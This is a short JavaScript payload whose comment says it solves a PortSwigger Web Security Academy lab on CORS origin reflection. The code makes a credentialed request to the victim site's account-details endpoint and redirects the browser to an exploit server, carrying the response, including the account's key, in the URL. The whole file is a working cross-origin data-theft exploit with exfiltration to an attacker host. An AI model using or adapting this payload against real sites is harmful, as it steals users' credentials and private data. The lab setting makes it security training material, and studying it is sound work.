// The payload below is meant to solve the following lab:
// https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack

var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://[LAB_SUB_DOMAIN].web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='https://[EXPLOIT_SUB_DOMAIN].exploit-server.net/exploit?key='+this.responseText;
};
